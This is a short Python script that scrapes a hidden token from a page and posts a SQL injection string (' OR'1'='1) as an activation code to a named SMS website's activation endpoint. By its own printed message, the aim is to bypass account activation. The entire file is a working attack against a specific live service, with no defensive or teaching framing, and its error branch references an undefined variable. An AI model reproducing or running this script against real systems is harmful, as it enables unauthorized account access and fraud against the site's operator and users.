import requests,os
from bs4 import BeautifulSoup
def bypass(url_verify):
    bypass="' OR'1'='1"
    response_code = requests.get(str(url_verify))
    html_content = response_code.content
    if response_code.status_code == 200:
       soup = BeautifulSoup(html_content, 'html.parser')
       hidden_input = soup.find('input', {'id': 'hidusername'})
       if hidden_input:
          token = hidden_input.get('value')
          requests.post('https://www.pangsms.com/activatecode',data={"activatecode": bypass,"hidusername": f"{token}","bconfirm.x": "40","bconfirm.y": "24"})
          print("\nx Bypassing account...")
       else:
          print("\ntoken เกิดข้อผิดพลาด [ติดต่อเเอดมิน toeymonifire@gmail.com]")
    else:
       print("\nเกิดข้อผิดพลาด:", response.status_code)



